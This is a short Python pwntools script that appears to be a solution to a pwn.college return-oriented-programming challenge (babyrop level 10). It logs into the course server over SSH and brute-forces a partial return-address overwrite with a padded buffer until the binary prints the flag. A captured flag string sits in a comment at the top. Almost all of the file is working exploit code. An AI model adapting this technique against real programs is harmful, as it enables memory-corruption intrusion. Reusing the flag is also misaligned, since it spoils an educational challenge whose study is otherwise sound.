#!/usr/bin/env python3
#pwn_college{Y6Mb3SlGLTsb1wkFtcdaA2mdSJN.dJzNywCN2gzW}
#python3 solution.py

from pwn import *

s = ssh(user="cse466", host="cse466.pwn.college", keyfile="/home/kali/.ssh/pwncollege-pwntool")
while(1):
    p = s.process("./babyrop_level10_testing1")
    #p = process("./babyrop_level10_testing1")

    p.recvuntil(b"[LEAK] Your input buffer is located at: ")
    leaks = p.recvuntil(b"\n") # return bytes
    #leaks = leaks.decode().split('.')   # convert byte to string
    #print("leaked filename address: ",leaks[0]) # to defeat ASLR

    #raw_input("attach gdb")
    #pad = cyclic(256, n=8)
    pad = b'A' * cyclic_find("qaaaaaaa", n=8)

    payload = pad + b'\x09\x18'
    #print(payload)
    p.sendline(payload)
   
    flag = p.recvall()
    if(b'pwn_college' in flag):
        print(flag)
        break
    #p.interactive()

